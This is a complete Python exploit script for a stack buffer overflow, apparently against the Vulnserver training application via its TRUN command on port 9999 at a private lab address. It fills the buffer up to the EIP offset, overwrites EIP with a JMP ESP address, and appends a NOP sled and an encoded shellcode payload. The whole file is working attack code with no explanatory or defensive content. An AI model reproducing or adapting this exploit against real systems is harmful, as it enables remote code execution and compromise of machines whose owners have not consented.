import socket
import os
import sys

host = '192.168.102.148'
port = 9999

# EIP overwritten at offset 2003
# ESP overwritten at offset 2007
# JMP ESP in an app module located at 0x625011AF

TOTAL_LENGTH = 5000

junk = 'A' * 2003
eip = '\xaf\x11\x50\x62'
esp = '\x90' * 16

buf =  ""
buf += "\xb8\x65\xfb\x25\x1b\xdb\xcb\xd9\x74\x24\xf4\x5e\x2b"
buf += "\xc9\xb1\x52\x31\x46\x12\x03\x46\x12\x83\xa3\xff\xc7"
buf += "\xee\xd7\xe8\x8a\x11\x27\xe9\xea\x98\xc2\xd8\x2a\xfe"
buf += "\x87\x4b\x9b\x74\xc5\x67\x50\xd8\xfd\xfc\x14\xf5\xf2"
buf += "\xb5\x93\x23\x3d\x45\x8f\x10\x5c\xc5\xd2\x44\xbe\xf4"
buf += "\x1c\x99\xbf\x31\x40\x50\xed\xea\x0e\xc7\x01\x9e\x5b"
buf += "\xd4\xaa\xec\x4a\x5c\x4f\xa4\x6d\x4d\xde\xbe\x37\x4d"
buf += "\xe1\x13\x4c\xc4\xf9\x70\x69\x9e\x72\x42\x05\x21\x52"
buf += "\x9a\xe6\x8e\x9b\x12\x15\xce\xdc\x95\xc6\xa5\x14\xe6"
buf += "\x7b\xbe\xe3\x94\xa7\x4b\xf7\x3f\x23\xeb\xd3\xbe\xe0"
buf += "\x6a\x90\xcd\x4d\xf8\xfe\xd1\x50\x2d\x75\xed\xd9\xd0"
buf += "\x59\x67\x99\xf6\x7d\x23\x79\x96\x24\x89\x2c\xa7\x36"
buf += "\x72\x90\x0d\x3d\x9f\xc5\x3f\x1c\xc8\x2a\x72\x9e\x08"
buf += "\x25\x05\xed\x3a\xea\xbd\x79\x77\x63\x18\x7e\x78\x5e"
buf += "\xdc\x10\x87\x61\x1d\x39\x4c\x35\x4d\x51\x65\x36\x06"
buf += "\xa1\x8a\xe3\x89\xf1\x24\x5c\x6a\xa1\x84\x0c\x02\xab"
buf += "\x0a\x72\x32\xd4\xc0\x1b\xd9\x2f\x83\xe3\xb6\x49\x4e"
buf += "\x8c\xc4\x95\x71\xf7\x40\x73\x1b\x17\x05\x2c\xb4\x8e"
buf += "\x0c\xa6\x25\x4e\x9b\xc3\x66\xc4\x28\x34\x28\x2d\x44"
buf += "\x26\xdd\xdd\x13\x14\x48\xe1\x89\x30\x16\x70\x56\xc0"
buf += "\x51\x69\xc1\x97\x36\x5f\x18\x7d\xab\xc6\xb2\x63\x36"
buf += "\x9e\xfd\x27\xed\x63\x03\xa6\x60\xdf\x27\xb8\xbc\xe0"
buf += "\x63\xec\x10\xb7\x3d\x5a\xd7\x61\x8c\x34\x81\xde\x46"
buf += "\xd0\x54\x2d\x59\xa6\x58\x78\x2f\x46\xe8\xd5\x76\x79"
buf += "\xc5\xb1\x7e\x02\x3b\x22\x80\xd9\xff\x5c\x70\xd3\x15"
buf += "\xc8\x2b\x86\x57\x94\xcb\x7d\x9b\xa1\x4f\x77\x64\x56"
buf += "\x4f\xf2\x61\x12\xd7\xef\x1b\x0b\xb2\x0f\x8f\x2c\x97"

sploit = 'TRUN /.:/' + junk + eip + esp + buf

sploit += 'D' * (TOTAL_LENGTH - len(sploit))

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.recv(1024)
expl.send(sploit)
expl.close()
